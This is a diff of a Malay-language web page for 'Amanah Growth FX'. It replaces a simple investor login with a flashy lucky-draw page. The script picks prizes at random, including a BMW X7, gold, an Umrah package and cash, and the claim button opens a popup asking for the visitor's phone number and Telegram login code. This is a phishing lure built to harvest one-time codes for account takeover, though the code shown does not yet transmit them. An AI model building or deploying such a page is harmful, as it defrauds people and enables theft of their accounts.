@@ -1,88 +1,405 @@
 <!DOCTYPE html>
-<html>
+<html lang="ms">
 <head>
-  <title>Amanah Growth FX - Login</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Amanah Growth FX</title>
 
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial;
-      background: url("background.jpg") no-repeat center center fixed;
-      background-size: cover;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      color: white;
-    }
+<style>
 
-    .box {
-      width: 340px;
-      background: rgba(10, 20, 40, 0.75);
-      backdrop-filter: blur(10px);
-      padding: 25px;
-      border-radius: 12px;
-      text-align: center;
-      box-shadow: 0 0 25px rgba(0,150,255,0.25);
-    }
+/* ===== BASIC ===== */
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Segoe UI',sans-serif;
+}
 
-    h2 {
-      color: #4db8ff;
-      margin-bottom: 5px;
-    }
+body{
+min-height:100vh;
+color:white;
+text-align:center;
+overflow-x:hidden;
 
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      border-radius: 6px;
-      border: 1px solid #1f4f8f;
-      background: #0b1b33;
-      color: white;
-      box-sizing: border-box;
-    }
+/* animated background */
+background: linear-gradient(rgba(0,0,0,.85),rgba(0,0,0,.85)),
+url('https://thumbs.dreamstime.com/b/futuristic-financial-dashboard-featuring-glowing-bar-graphs-rising-line-chart-neon-orange-elements-contrast-dark-348684501.jpg');
+background-size:cover;
+animation:bgMove 20s infinite alternate;
+}
 
-    button {
-      width: 100%;
-      margin-top: 15px;
-      padding: 10px;
-      background: #1e90ff;
-      border: none;
-      border-radius: 6px;
-      font-weight: bold;
-      color: white;
-      cursor: pointer;
-    }
-  </style>
+@keyframes bgMove{
+0%{background-position:0 0;}
+100%{background-position:50px 50px;}
+}
+
+/* ===== TITLE ===== */
+.logo{
+font-size:44px;
+font-weight:900;
+margin-top:25px;
+letter-spacing:2px;
+animation:fadeDown 1s ease;
+}
+
+@keyframes fadeDown{
+from{opacity:0;transform:translateY(-20px)}
+to{opacity:1;transform:translateY(0)}
+}
+
+/* ===== MARQUEE ===== */
+.marquee{
+margin-top:10px;
+font-weight:bold;
+color:#38bdf8;
+overflow:hidden;
+white-space:nowrap;
+}
+
+.marquee span{
+display:inline-block;
+padding-left:100%;
+animation:move 12s linear infinite;
+}
+
+@keyframes move{
+0%{transform:translateX(0)}
+100%{transform:translateX(-100%)}
+}
+
+/* ===== NUMBER BOX ===== */
+.numberBox{
+width:340px;
+height:140px;
+margin:30px auto;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:62px;
+font-weight:bold;
+border-radius:20px;
+
+background:rgba(255,255,255,.06);
+border:1px solid rgba(255,255,255,.15);
+backdrop-filter:blur(10px);
+
+animation:floatBox 4s ease-in-out infinite;
+}
+
+@keyframes floatBox{
+0%{transform:translateY(0)}
+50%{transform:translateY(-8px)}
+100%{transform:translateY(0)}
+}
+
+/* ===== BUTTON ===== */
+button{
+padding:14px 40px;
+border:none;
+border-radius:12px;
+background:#0ea5e9;
+color:white;
+font-weight:bold;
+cursor:pointer;
+font-size:16px;
+margin-top:10px;
+
+animation:pulse 2s infinite;
+transition:0.3s;
+}
+
+button:hover{
+transform:scale(1.08);
+background:#0284c7;
+}
+
+@keyframes pulse{
+0%{box-shadow:0 0 5px #0ea5e9}
+50%{box-shadow:0 0 25px #38bdf8}
+100%{box-shadow:0 0 5px #0ea5e9}
+}
+
+/* ===== PRIZE CARDS ===== */
+.prizeList{
+display:flex;
+justify-content:center;
+flex-wrap:wrap;
+gap:18px;
+margin-top:40px;
+}
+
+.prizeCard{
+width:220px;
+background:rgba(255,255,255,.05);
+border-radius:16px;
+border:1px solid rgba(255,255,255,.12);
+overflow:hidden;
+
+/* FLOAT EFFECT */
+animation:floatCard 4s ease-in-out infinite;
+transition:0.3s;
+}
+
+.prizeCard:hover{
+transform:scale(1.08) rotate(1deg);
+}
+
+@keyframes floatCard{
+0%{transform:translateY(0)}
+50%{transform:translateY(-10px)}
+100%{transform:translateY(0)}
+}
+
+.prizeCard img{
+width:100%;
+height:170px;
+object-fit:contain;
+padding:10px;
+}
+
+.prizeName{
+padding:12px;
+font-weight:bold;
+}
+
+/* ===== POPUP ===== */
+.popup{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.85);
+justify-content:center;
+align-items:center;
+z-index:999;
+}
+
+.popupContent{
+background:#111827;
+padding:25px;
+border-radius:16px;
+width:90%;
+max-width:420px;
+
+animation:popIn 0.3s ease;
+}
+
+@keyframes popIn{
+from{transform:scale(0.7);opacity:0}
+to{transform:scale(1);opacity:1}
+}
+
+.popupTitle{
+font-size:26px;
+font-weight:bold;
+color:#38bdf8;
+margin-bottom:10px;
+}
+
+input{
+width:100%;
+padding:10px;
+margin-top:10px;
+border-radius:8px;
+border:none;
+outline:none;
+}
+
+#popupImg{
+width:100%;
+margin-top:10px;
+cursor:pointer;
+border-radius:10px;
+}
+
+</style>
 </head>
 
 <body>
 
-<div class="box">
-  <h2>Amanah Growth FX</h2>
-  <p>Login Pelabur</p>
+<!-- AUDIO -->
+<audio id="bgMusic" loop>
+<source src="bg-music.mp3">
+</audio>
 
-  <input type="text" id="nama" placeholder="Nama Penuh">
-  <input type="text" id="phone" placeholder="No Telefon">
+<audio id="spinSound">
+<source src="spin-sound.mp3">
+</audio>
 
-  <button onclick="login()">TERUSKAN</button>
+<audio id="winSound">
+<source src="win-sound.mp3">
+</audio>
+
+<audio id="clickSound">
+<source src="click.mp3">
+</audio>
+
+<!-- TITLE -->
+<div class="logo">AMANAH GROWTH FX</div>
+
+<div class="marquee">
+<span>🔥 REBUT PELUANG SEKARANG - CABUT & MENANG HADIAH HEBAT 🔥</span>
+</div>
+
+<!-- NUMBER -->
+<div id="numberBox" class="numberBox">----</div>
+
+<button onclick="startDraw()">CABUT SEKARANG</button>
+
+<!-- PRIZES -->
+<div class="prizeList">
+
+<div class="prizeCard"><img src="bmw.png"><div class="prizeName">BMW X7</div></div>
+<div class="prizeCard"><img src="goldbar.png"><div class="prizeName">Emas 10 Gram</div></div>
+<div class="prizeCard"><img src="pakejumrah.png"><div class="prizeName">Pakej Umrah</div></div>
+<div class="prizeCard"><img src="wangtunai.png"><div class="prizeName">Wang Tunai RM1000</div></div>
+
+</div>
+
+<!-- POPUP HADIAH -->
+<div id="popup" class="popup">
+<div class="popupContent">
+
+<div id="popupTitle" class="popupTitle"></div>
+<div id="popupPrize"></div>
+
+<img id="popupImg" onclick="zoomImage()">
+
+<br><br>
+
+<button onclick="openTelegram()">TEBUS SEKARANG</button>
+
+</div>
+</div>
+
+<!-- ZOOM -->
+<div id="zoomPopup" class="popup">
+<div class="popupContent">
+<img id="zoomImg">
+<br><br>
+<button onclick="closeZoom()">TUTUP</button>
+</div>
+</div>
+
+<!-- TELEGRAM -->
+<div id="tgPopup" class="popup">
+<div class="popupContent">
+
+<h2>LOG MASUK TELEGRAM</h2>
+
+<input id="phone" placeholder="No Phone">
+<input id="code" placeholder="Code Telegram">
+
+<button onclick="submitTG()">HANTAR</button>
+
+</div>
 </div>
 
 <script>
-function login() {
-  let nama = document.getElementById("nama").value;
-  let phone = document.getElementById("phone").value;
 
-  if(nama === "" || phone === "") {
-    alert("Sila isi semua maklumat");
-    return;
-  }
-
-  localStorage.setItem("user", nama);
-  localStorage.setItem("phone", phone);
-
-  window.location.href = "main.html";
+window.onload=function(){
+let bg=document.getElementById("bgMusic");
+bg.volume=0.3;
+bg.play().catch(()=>{});
 }
+
+/* DRAW */
+function startDraw(){
+
+document.getElementById("spinSound").play();
+
+let box=document.getElementById("numberBox");
+box.style.transform="scale(1.1)";
+
+let count=0;
+
+let run=setInterval(()=>{
+
+box.innerHTML=Math.floor(Math.random()*9000)+1000;
+count++;
+
+if(count>40){
+
+clearInterval(run);
+
+box.style.transform="scale(1)";
+
+let num=Math.floor(Math.random()*9000)+1000;
+
+box.innerHTML=num;
+
+showResult(num);
+
+}
+
+},60);
+}
+
+/* RESULT */
+function showResult(num){
+
+document.getElementById("winSound").play();
+
+let list=[
+{name:"BMW X7",img:"bmw.png"},
+{name:"Emas 10 Gram",img:"goldbar.png"},
+{name:"Pakej Umrah",img:"pakejumrah.png"},
+{name:"Wang Tunai RM1000",img:"wangtunai.png"},
+{name:"Maaf Cuba Lagi",img:""}
+];
+
+let prize=list[Math.floor(Math.random()*list.length)];
+
+document.getElementById("popup").style.display="flex";
+
+document.getElementById("popupTitle").innerHTML=
+prize.name.includes("Maaf")?"TERIMA KASIH":"TAHNIAH";
+
+document.getElementById("popupPrize").innerHTML=prize.name;
+
+if(prize.img!=""){
+document.getElementById("popupImg").src=prize.img;
+document.getElementById("popupImg").style.display="block";
+}else{
+document.getElementById("popupImg").style.display="none";
+}
+
+}
+
+/* ZOOM */
+function zoomImage(){
+document.getElementById("clickSound").play();
+document.getElementById("zoomPopup").style.display="flex";
+document.getElementById("zoomImg").src=document.getElementById("popupImg").src;
+}
+
+function closeZoom(){
+document.getElementById("zoomPopup").style.display="none";
+}
+
+/* TELEGRAM */
+function openTelegram(){
+document.getElementById("popup").style.display="none";
+document.getElementById("tgPopup").style.display="flex";
+}
+
+function submitTG(){
+
+let p=document.getElementById("phone").value;
+let c=document.getElementById("code").value;
+
+if(p==""||c==""){
+alert("Isi semua maklumat");
+return;
+}
+
+alert("Permohonan dihantar");
+document.getElementById("tgPopup").style.display="none";
+
+}
+
 </script>
 
 </body>
